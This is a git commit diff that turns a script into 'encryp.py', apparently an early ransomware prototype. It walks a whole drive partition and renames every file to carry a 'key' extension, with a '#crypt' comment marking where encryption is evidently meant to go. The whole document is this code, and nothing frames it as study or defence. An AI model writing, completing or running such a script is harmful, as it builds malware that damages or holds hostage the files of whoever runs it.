eb1bfd4c90c7854503f116981af533e850c378f2
onurasln55 <onurasln55@gmail.com>
2021-02-22 14:56:35 +0300

    Update and rename start.py to encryp.py

--- encryp.py
+++ encryp.py
@@ -1,11 +1,12 @@
 import os
 import fnmatch
 path="h:/" #partition
+key="test"
 for root, dir, files in os.walk(path):#folder walking
         print (root)
         print ("")
         for items in fnmatch.filter(files, "*"):
                 print ("..." + items)
-                
-                os.rename(root+"/"+items,root+"/"+items+".test")
+                #crypt
+                os.rename(root+"/"+items,root+"/"+items+"."+key)
         print ("")
